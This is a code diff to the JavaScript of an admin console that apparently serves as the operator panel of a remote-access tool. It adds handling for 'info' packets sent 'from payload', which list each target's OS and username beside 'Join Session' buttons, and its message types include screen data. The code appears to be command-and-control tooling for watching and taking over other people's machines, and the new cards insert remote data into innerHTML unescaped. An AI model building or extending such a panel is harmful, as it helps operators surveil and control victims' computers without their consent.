@@ -32,9 +32,26 @@
 
                 if (data.type === 'registered') {
                     ws.isAdmin = true;
-                } else if (data.type === 'alert') {
+                } 
+                else if (data.type === 'alert') {
                     addLog(data.message);
-                } else {
+                } 
+                else if (data.type === 'info') {
+                    // NEW: Handle info packets from payload (triggered by broadcastToAdmin)
+                    addLog(`🟢 New User: ${data.os || 'Unknown'} (${data.user || 'Unknown'})`);
+                    
+                    // Add to grid
+                    if (!users[data.targetId]) {
+                        users[data.targetId] = { status: 'Online', logs: [], info: data };
+                    } else {
+                        // Update existing user info
+                        users[data.targetId].status = 'Online';
+                        users[data.targetId].info = data;
+                    }
+                    renderUsers();
+                }
+                else {
+                    // Generic fallback for other types (offer, answer, candidate, screen_data, etc.)
                     addLog(`[${data.targetId}] Received: ${data.type}`);
                     if (!users[data.targetId]) {
                         users[data.targetId] = { status: 'Online', logs: [] };
@@ -59,8 +76,10 @@
             for (const [id, data] of Object.entries(users)) {
                 const card = document.createElement('div');
                 card.className = 'card';
+                const osInfo = data.info ? `${data.info.os} / ${data.info.user}` : 'Unknown OS';
                 card.innerHTML = `
                     <strong>User ID: ${id}</strong><br>
+                    Info: ${osInfo}<br>
                     Status: ${data.status}<br>
                     <button class="btn" onclick="joinUser('${id}')">Join Session</button>
                 `;
